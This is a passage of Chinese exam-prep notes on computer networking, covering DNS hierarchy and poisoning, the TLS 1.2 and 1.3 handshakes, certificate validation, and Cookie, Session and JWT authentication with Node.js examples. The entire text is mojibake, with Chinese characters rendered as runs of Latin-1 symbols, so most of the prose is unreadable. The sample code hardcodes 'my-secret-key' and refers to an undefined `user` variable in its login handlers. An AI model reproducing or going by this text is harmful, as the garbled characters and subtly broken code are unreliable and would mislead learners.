- **ç°è±¡**ï¼šåŸŸåè§£æåˆ°é”™è¯¯IP
- **åŸå› **ï¼šDNSç¼“å­˜è¢«æ¶æ„ä¿®æ”¹
- **é˜²æŠ¤**ï¼šä½¿ç”¨å®‰å…¨DNSï¼ˆå¦‚8.8.8.8ï¼‰

**DNS over HTTPS (DoH)**ï¼š
```
ä¼ ç»ŸDNSï¼šæ˜æ–‡ä¼ è¾“ï¼Œå®¹æ˜“è¢«çªƒå¬
DoHï¼šé€šè¿‡HTTPSåŠ å¯†DNSæŸ¥è¯¢
ä¼˜åŠ¿ï¼šéšç§ä¿æŠ¤ï¼Œé˜²æ­¢DNSæ±¡æŸ“
```

### ğŸ’¡ è®°å¿†æŠ€å·§

**DNSå±‚æ¬¡è®°å¿†**ï¼š**"æ ¹é¡¶æƒæœ¬"**
- **æ ¹**ï¼šæ ¹åŸŸåæœåŠ¡å™¨ï¼ˆ.ï¼‰
- **é¡¶**ï¼šé¡¶çº§åŸŸæœåŠ¡å™¨ï¼ˆ.comã€.orgï¼‰
- **æƒ**ï¼šæƒå¨åŸŸåæœåŠ¡å™¨ï¼ˆbaidu.comï¼‰
- **æœ¬**ï¼šæœ¬åœ°DNSæœåŠ¡å™¨

**æŸ¥è¯¢ç±»å‹è®°å¿†**ï¼š
- **é€’å½’**ï¼š**"å…¨åŒ…æœåŠ¡"** â†’ æœ¬åœ°DNSå¸®ä½ æŸ¥å®Œæ•´ä¸ªè¿‡ç¨‹
- **è¿­ä»£**ï¼š**"æŒ‡è·¯æœåŠ¡"** â†’ æ¯æ¬¡åªå‘Šè¯‰ä½ ä¸‹ä¸€æ­¥å»å“ª

**è®°å½•ç±»å‹è®°å¿†**ï¼š
- **A**ï¼š**Address** â†’ IPv4åœ°å€
- **AAAA**ï¼š**4ä¸ªA** â†’ IPv6åœ°å€ï¼ˆæ›´é•¿ï¼‰
- **CNAME**ï¼š**Canonical Name** â†’ åˆ«å
- **MX**ï¼š**Mail eXchange** â†’ é‚®ä»¶æœåŠ¡å™¨

### â“ å…¸å‹è€ƒé¢˜

1. **é€‰æ‹©é¢˜**ï¼šDNSé‡‡ç”¨ä»€ä¹ˆæŸ¥è¯¢æ–¹å¼ï¼Ÿ
   - A. åªæœ‰é€’å½’  B. åªæœ‰è¿­ä»£  C. é€’å½’+è¿­ä»£  D. éšæœºé€‰æ‹©
   - **ç­”æ¡ˆ**ï¼šCï¼ˆå®¢æˆ·ç«¯åˆ°æœ¬åœ°DNSæ˜¯é€’å½’ï¼Œæœ¬åœ°DNSåˆ°å…¶ä»–DNSæ˜¯è¿­ä»£ï¼‰

2. **ç®€ç­”é¢˜**ï¼šè§£é‡ŠDNSçš„å±‚æ¬¡ç»“æ„
   - **è¦ç‚¹**ï¼šæ ¹åŸŸåæœåŠ¡å™¨ã€é¡¶çº§åŸŸæœåŠ¡å™¨ã€æƒå¨åŸŸåæœåŠ¡å™¨

3. **åº”ç”¨é¢˜**ï¼šç”¨æˆ·è®¿é—®www.example.comå¾ˆæ…¢ï¼Œå¯èƒ½æ˜¯ä»€ä¹ˆDNSé—®é¢˜ï¼Ÿ
   - **è¦ç‚¹**ï¼šDNSè§£æè¶…æ—¶ã€DNSæœåŠ¡å™¨æ•…éšœã€DNSç¼“å­˜é—®é¢˜

### âš ï¸ æ˜“é”™ç‚¹

- **å±‚æ¬¡ç»“æ„**ï¼šæ ¹åŸŸåæœåŠ¡å™¨åœ¨æœ€é¡¶å±‚ï¼Œä¸æ˜¯é¡¶çº§åŸŸ
- **æŸ¥è¯¢æ–¹å¼**ï¼šå®¢æˆ·ç«¯å’Œæœ¬åœ°DNSæ˜¯é€’å½’ï¼Œæœ¬åœ°DNSå’Œå…¶ä»–æ˜¯è¿­ä»£
- **ç¼“å­˜æ—¶é—´**ï¼šTTLæ§åˆ¶ç¼“å­˜æ—¶é—´ï¼Œä¸æ˜¯å›ºå®šçš„
- **è®°å½•ç±»å‹**ï¼šAè®°å½•æ˜¯IPv4ï¼ŒAAAAæ˜¯IPv6ï¼Œåˆ«ææ··

---

## 7ï¸âƒ£ HTTPSä¸TLS/SSL

### ğŸ¯ æ ¸å¿ƒæ¦‚å¿µ

**HTTPS** = HTTP + TLS/SSLï¼Œä¸ºHTTPé€šä¿¡æä¾›**åŠ å¯†ã€è®¤è¯ã€å®Œæ•´æ€§ä¿æŠ¤**ï¼Œæ˜¯ç°ä»£Webå®‰å…¨çš„åŸºç¡€ã€‚

### ğŸ“– è¯¦ç»†è§£æ

#### HTTPSä¸HTTPçš„åŒºåˆ«

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚     ç‰¹æ€§     â”‚      HTTP       â”‚      HTTPS      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   ç«¯å£å·     â”‚       80        â”‚       443       â”‚
â”‚   æ•°æ®ä¼ è¾“   â”‚     æ˜æ–‡ä¼ è¾“     â”‚     åŠ å¯†ä¼ è¾“     â”‚
â”‚   å®‰å…¨æ€§     â”‚      ä¸å®‰å…¨      â”‚      å®‰å…¨       â”‚
â”‚   æ€§èƒ½å¼€é”€   â”‚       æ—         â”‚     æœ‰ä¸€äº›       â”‚
â”‚   SEOæƒé‡    â”‚      è¾ƒä½       â”‚      è¾ƒé«˜       â”‚
â”‚   æµè§ˆå™¨æ˜¾ç¤º â”‚    "ä¸å®‰å…¨"     â”‚     ç»¿è‰²é”      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### TLS/SSLåè®®ç‰ˆæœ¬

```
SSL 1.0  (1994) â†’ ä»æœªå‘å¸ƒ
SSL 2.0  (1995) â†’ ä¸¥é‡å®‰å…¨æ¼æ´ï¼Œå·²åºŸå¼ƒ
SSL 3.0  (1996) â†’ æœ‰å®‰å…¨é—®é¢˜ï¼Œå·²åºŸå¼ƒ
TLS 1.0  (1999) â†’ åŸºäºSSL 3.0æ”¹è¿›
TLS 1.1  (2006) â†’ ä¿®å¤TLS 1.0é—®é¢˜
TLS 1.2  (2008) â†’ ç›®å‰ä¸»æµç‰ˆæœ¬
TLS 1.3  (2018) â†’ æœ€æ–°ç‰ˆæœ¬ï¼Œæ€§èƒ½å’Œå®‰å…¨éƒ½æ›´å¥½
```

#### TLSæ¡æ‰‹è¿‡ç¨‹ï¼ˆTLS 1.2ï¼‰

```
å®¢æˆ·ç«¯                                    æœåŠ¡å™¨
   |                                        |
   |---- 1. Client Hello ------------------>|
   |     (æ”¯æŒçš„åŠ å¯†å¥—ä»¶ã€éšæœºæ•°)              |
   |                                        |
   |<--- 2. Server Hello -------------------|
   |     (é€‰æ‹©çš„åŠ å¯†å¥—ä»¶ã€éšæœºæ•°ã€è¯ä¹¦)        |
   |                                        |
   |<--- 3. Certificate --------------------|
   |     (æœåŠ¡å™¨è¯ä¹¦)                        |
   |                                        |
   |<--- 4. Server Hello Done --------------|
   |                                        |
   |---- 5. Client Key Exchange ----------->|
   |     (ç”¨æœåŠ¡å™¨å…¬é’¥åŠ å¯†çš„é¢„ä¸»å¯†é’¥)          |
   |                                        |
   |---- 6. Change Cipher Spec ------------>|
   |---- 7. Finished ---------------------->|
   |                                        |
   |<--- 8. Change Cipher Spec -------------|
   |<--- 9. Finished -----------------------|
   |                                        |
          åŠ å¯†é€šä¿¡å¼€å§‹
```

**è¯¦ç»†æ­¥éª¤è§£æ**ï¼š

**1. Client Hello**ï¼š
```
åŒ…å«ä¿¡æ¯ï¼š
- TLSç‰ˆæœ¬å·
- å®¢æˆ·ç«¯éšæœºæ•°ï¼ˆClient Randomï¼‰
- æ”¯æŒçš„åŠ å¯†å¥—ä»¶åˆ—è¡¨
- æ”¯æŒçš„å‹ç¼©æ–¹æ³•
- æ‰©å±•ä¿¡æ¯ï¼ˆSNIç­‰ï¼‰
```

**2-4. Server Hello + Certificate**ï¼š
```
æœåŠ¡å™¨å“åº”ï¼š
- é€‰æ‹©çš„TLSç‰ˆæœ¬
- æœåŠ¡å™¨éšæœºæ•°ï¼ˆServer Randomï¼‰
- é€‰æ‹©çš„åŠ å¯†å¥—ä»¶
- æœåŠ¡å™¨è¯ä¹¦ï¼ˆåŒ…å«å…¬é’¥ï¼‰
- ç»“æŸæ ‡å¿—
```

**5. Client Key Exchange**ï¼š
```
å®¢æˆ·ç«¯ï¼š
- ç”Ÿæˆé¢„ä¸»å¯†é’¥ï¼ˆPre-Master Secretï¼‰
- ç”¨æœåŠ¡å™¨å…¬é’¥åŠ å¯†é¢„ä¸»å¯†é’¥
- å‘é€ç»™æœåŠ¡å™¨
```

**6-7. å®¢æˆ·ç«¯åŠ å¯†åˆ‡æ¢**ï¼š
```
å®¢æˆ·ç«¯ï¼š
- ç”Ÿæˆä¸»å¯†é’¥ï¼ˆMaster Secretï¼‰
- é€šçŸ¥åˆ‡æ¢åˆ°åŠ å¯†æ¨¡å¼
- å‘é€Finishedæ¶ˆæ¯ï¼ˆåŠ å¯†çš„æ¡æ‰‹æ•°æ®æ‘˜è¦ï¼‰
```

**8-9. æœåŠ¡å™¨åŠ å¯†åˆ‡æ¢**ï¼š
```
æœåŠ¡å™¨ï¼š
- è§£å¯†é¢„ä¸»å¯†é’¥ï¼Œç”Ÿæˆä¸»å¯†é’¥
- é€šçŸ¥åˆ‡æ¢åˆ°åŠ å¯†æ¨¡å¼
- å‘é€Finishedæ¶ˆæ¯éªŒè¯æ¡æ‰‹è¿‡ç¨‹
```

#### TLS 1.3çš„æ”¹è¿›

**æ¡æ‰‹ä¼˜åŒ–**ï¼š
```
TLS 1.2ï¼š2-RTTæ¡æ‰‹
å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ (4æ¬¡é€šä¿¡)

TLS 1.3ï¼š1-RTTæ¡æ‰‹
å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ (3æ¬¡é€šä¿¡)

0-RTTæ¨¡å¼ï¼š
å®¢æˆ·ç«¯ç›´æ¥å‘é€åŠ å¯†æ•°æ®ï¼ˆéœ€è¦ä¹‹å‰å»ºç«‹è¿‡è¿æ¥ï¼‰
```

**å®‰å…¨æ”¹è¿›**ï¼š
```
âœ… ç§»é™¤ä¸å®‰å…¨çš„åŠ å¯†ç®—æ³•ï¼ˆRC4ã€MD5ã€SHA-1ï¼‰
âœ… å¿…é¡»ä½¿ç”¨å‰å‘å®‰å…¨çš„å¯†é’¥äº¤æ¢
âœ… ç®€åŒ–åŠ å¯†å¥—ä»¶é€‰æ‹©
âœ… åŠ å¯†æ›´å¤šæ¡æ‰‹æ¶ˆæ¯
```

#### æ•°å­—è¯ä¹¦ä¸PKI

**è¯ä¹¦ç»„æˆéƒ¨åˆ†**ï¼š
```
æ•°å­—è¯ä¹¦åŒ…å«ï¼š
1. è¯ä¹¦ç‰ˆæœ¬
2. åºåˆ—å·
3. ç­¾åç®—æ³•
4. é¢å‘è€…ä¿¡æ¯ï¼ˆCAï¼‰
5. æœ‰æ•ˆæœŸ
6. ä½¿ç”¨è€…ä¿¡æ¯ï¼ˆåŸŸåï¼‰
7. å…¬é’¥ä¿¡æ¯
8. æ‰©å±•ä¿¡æ¯
9. æ•°å­—ç­¾å
```

**è¯ä¹¦éªŒè¯è¿‡ç¨‹**ï¼š
```
1. æ£€æŸ¥è¯ä¹¦æœ‰æ•ˆæœŸ
2. æ£€æŸ¥åŸŸååŒ¹é…ï¼ˆCommon Nameæˆ–SANï¼‰
3. æ£€æŸ¥è¯ä¹¦é“¾å®Œæ•´æ€§
4. éªŒè¯CAç­¾å
5. æ£€æŸ¥è¯ä¹¦æ’¤é”€çŠ¶æ€ï¼ˆCRL/OCSPï¼‰
```

**è¯ä¹¦é“¾ç»“æ„**ï¼š
```
æ ¹è¯ä¹¦ï¼ˆRoot CAï¼‰- è‡ªç­¾åï¼Œæµè§ˆå™¨å†…ç½®
    â†“
ä¸­é—´è¯ä¹¦ï¼ˆIntermediate CAï¼‰- æ ¹CAç­¾å
    â†“
æœåŠ¡å™¨è¯ä¹¦ï¼ˆEnd Entityï¼‰- ä¸­é—´CAç­¾å
```

#### åŠ å¯†ç®—æ³•

**å¯¹ç§°åŠ å¯†**ï¼ˆæ•°æ®åŠ å¯†ï¼‰ï¼š
```
AES-128-GCM  â† æ¨è
AES-256-GCM  â† æ¨è
ChaCha20-Poly1305  â† TLS 1.3æ¨è

ç‰¹ç‚¹ï¼šåŠ å¯†è§£å¯†ä½¿ç”¨ç›¸åŒå¯†é’¥ï¼Œé€Ÿåº¦å¿«
```

**éå¯¹ç§°åŠ å¯†**ï¼ˆå¯†é’¥äº¤æ¢ï¼‰ï¼š
```
RSA-2048     â† ä¼ ç»Ÿæ–¹æ¡ˆ
ECDHE-P256   â† æ¨èï¼ˆæ¤­åœ†æ›²çº¿ï¼‰
ECDHE-P384   â† é«˜å®‰å…¨çº§åˆ«

ç‰¹ç‚¹ï¼šå…¬é’¥åŠ å¯†ç§é’¥è§£å¯†ï¼Œå®‰å…¨ä½†è¾ƒæ…¢
```

**å“ˆå¸Œç®—æ³•**ï¼ˆå®Œæ•´æ€§éªŒè¯ï¼‰ï¼š
```
SHA-256  â† æ¨è
SHA-384  â† é«˜å®‰å…¨çº§åˆ«
MD5      â† å·²åºŸå¼ƒï¼ˆä¸å®‰å…¨ï¼‰
SHA-1    â† å·²åºŸå¼ƒï¼ˆä¸å®‰å…¨ï¼‰
```

### ğŸ’¡ è®°å¿†æŠ€å·§

**HTTPSç‰¹ç‚¹è®°å¿†**ï¼š**"åŠ è®¤å®Œ"**
- **åŠ **å¯†ï¼šæ•°æ®ä¼ è¾“åŠ å¯†
- **è®¤**è¯ï¼šæœåŠ¡å™¨èº«ä»½è®¤è¯
- **å®Œ**æ•´æ€§ï¼šæ•°æ®å®Œæ•´æ€§ä¿æŠ¤

**TLSæ¡æ‰‹è®°å¿†**ï¼š**"ä½ å¥½-æˆ‘å¥½-äº¤æ¢-å®Œæˆ"**
1. **Client Hello**ï¼š**"ä½ å¥½ï¼Œæˆ‘æ”¯æŒè¿™äº›åŠ å¯†"**
2. **Server Hello**ï¼š**"æˆ‘å¥½ï¼Œæˆ‘é€‰æ‹©è¿™ä¸ªåŠ å¯†"**
3. **Key Exchange**ï¼š**"äº¤æ¢å¯†é’¥ææ–™"**
4. **Finished**ï¼š**"æ¡æ‰‹å®Œæˆï¼Œå¼€å§‹åŠ å¯†"**

**è¯ä¹¦éªŒè¯è®°å¿†**ï¼š**"æœŸåŸŸé“¾ç­¾æ’¤"**
- **æœŸ**ï¼šæœ‰æ•ˆæœŸæ£€æŸ¥
- **åŸŸ**ï¼šåŸŸååŒ¹é…æ£€æŸ¥
- **é“¾**ï¼šè¯ä¹¦é“¾éªŒè¯
- **ç­¾**ï¼šæ•°å­—ç­¾åéªŒè¯
- **æ’¤**ï¼šæ’¤é”€çŠ¶æ€æ£€æŸ¥

### â“ å…¸å‹è€ƒé¢˜

1. **é€‰æ‹©é¢˜**ï¼šHTTPSä½¿ç”¨çš„é»˜è®¤ç«¯å£æ˜¯ï¼Ÿ
   - A. 80  B. 443  C. 8080  D. 8443
   - **ç­”æ¡ˆ**ï¼šB

2. **ç®€ç­”é¢˜**ï¼šTLSæ¡æ‰‹è¿‡ç¨‹çš„ä¸»è¦æ­¥éª¤
   - **è¦ç‚¹**ï¼šClient Helloã€Server Helloã€å¯†é’¥äº¤æ¢ã€Finished

3. **åˆ†æé¢˜**ï¼šä¸ºä»€ä¹ˆHTTPSæ¯”HTTPå®‰å…¨ï¼Ÿ
   - **è¦ç‚¹**ï¼šåŠ å¯†ä¼ è¾“ã€èº«ä»½è®¤è¯ã€å®Œæ•´æ€§ä¿æŠ¤

### âš ï¸ æ˜“é”™ç‚¹

- **SSL vs TLS**ï¼šSSLå·²è¿‡æ—¶ï¼Œç°åœ¨éƒ½æ˜¯TLSï¼Œä½†ä¹ æƒ¯ä¸Šè¿˜å«SSL
- **è¯ä¹¦éªŒè¯**ï¼šä¸åªéªŒè¯CAç­¾åï¼Œè¿˜è¦éªŒè¯åŸŸååŒ¹é…
- **æ€§èƒ½å½±å“**ï¼šç°ä»£HTTPSæ€§èƒ½å½±å“å¾ˆå°ï¼ŒTLS 1.3æ›´å¿«
- **ç«¯å£åŒºåˆ«**ï¼šHTTPæ˜¯80ï¼ŒHTTPSæ˜¯443ï¼Œä¸è¦ææ··

---

## 8ï¸âƒ£ Cookie/Session/Token

### ğŸ¯ æ ¸å¿ƒæ¦‚å¿µ

**Cookieã€Sessionã€Token**æ˜¯Webåº”ç”¨ä¸­å®ç°**ç”¨æˆ·èº«ä»½è¯†åˆ«å’ŒçŠ¶æ€ç®¡ç†**çš„ä¸‰ç§ä¸»è¦æœºåˆ¶ï¼Œå„æœ‰ç‰¹ç‚¹å’Œé€‚ç”¨åœºæ™¯ã€‚

### ğŸ“– è¯¦ç»†è§£æ

#### HTTPæ— çŠ¶æ€ç‰¹æ€§

```
HTTPåè®®æœ¬èº«æ˜¯æ— çŠ¶æ€çš„ï¼š
å®¢æˆ·ç«¯å‘é€è¯·æ±‚ â†’ æœåŠ¡å™¨å“åº” â†’ è¿æ¥æ–­å¼€

é—®é¢˜ï¼šæœåŠ¡å™¨æ— æ³•è¯†åˆ«ç”¨æˆ·èº«ä»½
è§£å†³ï¼šä½¿ç”¨çŠ¶æ€ç®¡ç†æœºåˆ¶
```

#### Cookieæœºåˆ¶

**Cookieå·¥ä½œåŸç†**ï¼š
```
1. é¦–æ¬¡è®¿é—®ï¼š
   å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼šGET /login
   å®¢æˆ·ç«¯ â† æœåŠ¡å™¨ï¼šSet-Cookie: sessionid=abc123

2. åç»­è®¿é—®ï¼š
   å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼šGET /profile
                    Cookie: sessionid=abc123
```

**Cookieå±æ€§**ï¼š
```javascript
Set-Cookie: sessionid=abc123;
            Domain=.example.com;     // ä½œç”¨åŸŸå
            Path=/;                  // ä½œç”¨è·¯å¾„
            Expires=Wed, 21 Oct 2025 07:28:00 GMT;  // è¿‡æœŸæ—¶é—´
            Max-Age=3600;           // ç”Ÿå­˜æ—¶é—´ï¼ˆç§’ï¼‰
            Secure;                 // åªåœ¨HTTPSä¼ è¾“
            HttpOnly;               // ç¦æ­¢JSè®¿é—®
            SameSite=Strict         // è·¨ç«™è¯·æ±‚ç­–ç•¥
```

**Cookieç±»å‹**ï¼š
```
ä¼šè¯Cookieï¼ˆSession Cookieï¼‰ï¼š
- æµè§ˆå™¨å…³é—­æ—¶åˆ é™¤
- ä¸è®¾ç½®Expiresæˆ–Max-Age

æŒä¹…Cookieï¼ˆPersistent Cookieï¼‰ï¼š
- æŒ‡å®šè¿‡æœŸæ—¶é—´
- å­˜å‚¨åœ¨ç¡¬ç›˜ä¸Š

å®‰å…¨Cookieï¼š
- Secureï¼šåªåœ¨HTTPSä¼ è¾“
- HttpOnlyï¼šé˜²æ­¢XSSæ”»å‡»
- SameSiteï¼šé˜²æ­¢CSRFæ”»å‡»
```

#### Sessionæœºåˆ¶

**Sessionå·¥ä½œæµç¨‹**ï¼š
```
1. ç”¨æˆ·ç™»å½•
   â†“
2. æœåŠ¡å™¨åˆ›å»ºSessionå¯¹è±¡ï¼Œç”ŸæˆSessionID
   â†“
3. å°†SessionIDé€šè¿‡Cookieå‘é€ç»™å®¢æˆ·ç«¯
   â†“
4. å®¢æˆ·ç«¯ä¿å­˜SessionID Cookie
   â†“
5. åç»­è¯·æ±‚æºå¸¦SessionID
   â†“
6. æœåŠ¡å™¨æ ¹æ®SessionIDæŸ¥æ‰¾Sessionå¯¹è±¡
```

**Sessionå­˜å‚¨æ–¹å¼**ï¼š
```
å†…å­˜å­˜å‚¨ï¼š
âœ… é€Ÿåº¦å¿«
âŒ æœåŠ¡å™¨é‡å¯ä¸¢å¤±
âŒ ä¸æ”¯æŒå¤šæœåŠ¡å™¨

æ•°æ®åº“å­˜å‚¨ï¼š
âœ… æŒä¹…åŒ–
âœ… æ”¯æŒå¤šæœåŠ¡å™¨
âŒ é€Ÿåº¦è¾ƒæ…¢

Rediså­˜å‚¨ï¼š
âœ… é€Ÿåº¦å¿«
âœ… æŒä¹…åŒ–
âœ… æ”¯æŒå¤šæœåŠ¡å™¨
âœ… æ”¯æŒè¿‡æœŸè‡ªåŠ¨æ¸…ç†
```

**Sessionå®ç°ç¤ºä¾‹**ï¼š
```javascript
// Node.js + Express + Redis
const session = require('express-session');
const RedisStore = require('connect-redis')(session);

app.use(session({
  store: new RedisStore({
    host: 'localhost',
    port: 6379
  }),
  secret: 'my-secret-key',
  resave: false,
  saveUninitialized: false,
  cookie: {
    maxAge: 1000 * 60 * 60 * 24, // 24å°æ—¶
    httpOnly: true,
    secure: false // ç”Ÿäº§ç¯å¢ƒè®¾ä¸ºtrue
  }
}));

// ç™»å½•æ¥å£
app.post('/login', (req, res) => {
  // éªŒè¯ç”¨æˆ·åå¯†ç 
  if (isValidUser(req.body.username, req.body.password)) {
    req.session.userId = user.id;
    req.session.username = user.username;
    res.json({ success: true });
  }
});

// éœ€è¦ç™»å½•çš„æ¥å£
app.get('/profile', (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'æœªç™»å½•' });
  }

  res.json({
    userId: req.session.userId,
    username: req.session.username
  });
});
```

#### Tokenæœºåˆ¶

**Tokenç‰¹ç‚¹**ï¼š
```
âœ… æ— çŠ¶æ€ï¼šæœåŠ¡å™¨ä¸éœ€è¦å­˜å‚¨
âœ… å¯æ‰©å±•ï¼šå®¹æ˜“å®ç°å•ç‚¹ç™»å½•
âœ… è·¨åŸŸå‹å¥½ï¼šå¯ä»¥æ”¾åœ¨Headerä¸­
âœ… ç§»åŠ¨å‹å¥½ï¼šAPPä¸­å®¹æ˜“ä½¿ç”¨
```

**JWTï¼ˆJSON Web Tokenï¼‰ç»“æ„**ï¼š
```
JWT = Header.Payload.Signature

Headerï¼ˆå¤´éƒ¨ï¼‰ï¼š
{
  "alg": "HS256",      // ç­¾åç®—æ³•
  "typ": "JWT"         // tokenç±»å‹
}

Payloadï¼ˆè½½è·ï¼‰ï¼š
{
  "sub": "1234567890", // ç”¨æˆ·ID
  "name": "å¼ ä¸‰",      // ç”¨æˆ·ä¿¡æ¯
  "iat": 1516239022,   // ç­¾å‘æ—¶é—´
  "exp": 1516325422    // è¿‡æœŸæ—¶é—´
}

Signatureï¼ˆç­¾åï¼‰ï¼š
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```

**JWTä½¿ç”¨æµç¨‹**ï¼š
```
1. ç”¨æˆ·ç™»å½•
   â†“
2. æœåŠ¡å™¨éªŒè¯ç”¨æˆ·ä¿¡æ¯
   â†“
3. æœåŠ¡å™¨ç”ŸæˆJWTå¹¶è¿”å›
   â†“
4. å®¢æˆ·ç«¯ä¿å­˜JWTï¼ˆlocalStorage/Cookieï¼‰
   â†“
5. åç»­è¯·æ±‚åœ¨Headerä¸­æºå¸¦JWT
   Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
   â†“
6. æœåŠ¡å™¨éªŒè¯JWTç­¾åå’Œæœ‰æ•ˆæœŸ
```

**JWTå®ç°ç¤ºä¾‹**ï¼š
```javascript
const jwt = require('jsonwebtoken');

// ç”ŸæˆToken
function generateToken(user) {
  const payload = {
    userId: user.id,
    username: user.username,
    exp: Math.floor(Date.now() / 1000) + (60 * 60 * 24) // 24å°æ—¶è¿‡æœŸ
  };

  return jwt.sign(payload, 'my-secret-key');
}

// éªŒè¯Tokenä¸­é—´ä»¶
function verifyToken(req, res, next) {
  const token = req.headers.authorization?.replace('Bearer ', '');

  if (!token) {
    return res.status(401).json({ error: 'ç¼ºå°‘Token' });
  }

  try {
    const decoded = jwt.verify(token, 'my-secret-key');
    req.user = decoded;
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Tokenæ— æ•ˆ' });
  }
}

// ç™»å½•æ¥å£
app.post('/login', (req, res) => {
  if (isValidUser(req.body.username, req.body.password)) {
    const token = generateToken(user);
    res.json({ token });
  }
});

// å—ä¿æŠ¤çš„æ¥å£
app.get('/profile', verifyToken, (req, res) => {
  res.json({
    userId: req.user.userId,
    username: req.user.username
  });
});
```

#### ä¸‰ç§æ–¹æ¡ˆå¯¹æ¯”

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    ç‰¹æ€§     â”‚   Cookie    â”‚   Session   â”‚    Token    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ å­˜å‚¨ä½ç½®   â”‚ å®¢æˆ·ç«¯æµè§ˆå™¨ â”‚ æœåŠ¡å™¨      â”‚ å®¢æˆ·ç«¯       â”‚
â”‚ å®‰å…¨æ€§     â”‚ ä¸­ç­‰        â”‚ é«˜          â”‚ ä¸­ç­‰         â”‚
â”‚ æœåŠ¡å™¨è´Ÿæ‹… â”‚ ä½          â”‚ é«˜          â”‚ ä½           â”‚
â”‚ è·¨åŸŸæ”¯æŒ   â”‚ å›°éš¾        â”‚ å›°éš¾        â”‚ å®¹æ˜“         â”‚
â”‚ ç§»åŠ¨ç«¯æ”¯æŒ â”‚ ä¸æ”¯æŒ      â”‚ ä¸æ”¯æŒ      â”‚ æ”¯æŒ         â”‚
â”‚ æ³¨é”€       â”‚ åˆ é™¤Cookie  â”‚ é”€æ¯Session â”‚ å®¢æˆ·ç«¯åˆ é™¤   â”‚
â”‚ è¿‡æœŸå¤„ç†   â”‚ è‡ªåŠ¨è¿‡æœŸ    â”‚ æœåŠ¡å™¨æ§åˆ¶  â”‚ å†…ç½®è¿‡æœŸ     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### å®‰å…¨è€ƒè™‘

**Cookieå®‰å…¨**ï¼š
```javascript
// å®‰å…¨Cookieè®¾ç½®
app.use(session({
  cookie: {
    httpOnly: true,    // é˜²æ­¢XSS
    secure: true,      // åªåœ¨HTTPSä¼ è¾“
    sameSite: 'strict' // é˜²æ­¢CSRF
  }
}));
```

**Tokenå®‰å…¨**ï¼š
```javascript
// JWTæœ€ä½³å®è·µ
1. ä½¿ç”¨å¼ºå¯†é’¥ï¼šè‡³å°‘256ä½éšæœºå­—ç¬¦ä¸²
2. è®¾ç½®åˆç†è¿‡æœŸæ—¶é—´ï¼šé¿å…æ°¸ä¸è¿‡æœŸçš„Token
3. æ•æ„Ÿä¿¡æ¯ä¸æ”¾åœ¨Payloadä¸­ï¼šJWTæ˜¯å¯è§£ç çš„
4. è€ƒè™‘ä½¿ç”¨åˆ·æ–°Tokenæœºåˆ¶
5. æœåŠ¡ç«¯ç»´æŠ¤é»‘åå•å¤„ç†æ³¨é”€
```

### ğŸ’¡ è®°å¿†æŠ€å·§

**ä¸‰ç§æœºåˆ¶è®°å¿†**ï¼š**"é¥¼å¹²-ä¼šè¯-ä»¤ç‰Œ"**
- **Cookie**ï¼š**"é¥¼å¹²"** â†’ æµè§ˆå™¨è‡ªåŠ¨æºå¸¦
- **Session**ï¼š**"ä¼šè¯"** â†’ æœåŠ¡å™¨è®°ä½ä½ 
- **Token**ï¼š**"ä»¤ç‰Œ"** â†’ è‡ªå¸¦èº«ä»½è¯æ˜

**é€‚ç”¨åœºæ™¯è®°å¿†**ï¼š
- **Cookie**ï¼šç®€å•ç½‘ç«™ï¼Œç”¨æˆ·è¯†åˆ«
- **Session**ï¼šä¼ ç»ŸWebåº”ç”¨ï¼Œå®‰å…¨è¦æ±‚é«˜
- **Token**ï¼šç§»åŠ¨åº”ç”¨ï¼Œå¾®æœåŠ¡æ¶æ„

**å®‰å…¨è®°å¿†**ï¼š**"HTTP-å®‰å…¨-åŒç«™"**
- **HttpOnly**ï¼šé˜²XSSæ”»å‡»
- **Secure**ï¼šHTTPSä¼ è¾“
- **SameSite**ï¼šé˜²CSRFæ”»å‡»

### â“ å…¸å‹è€ƒé¢˜

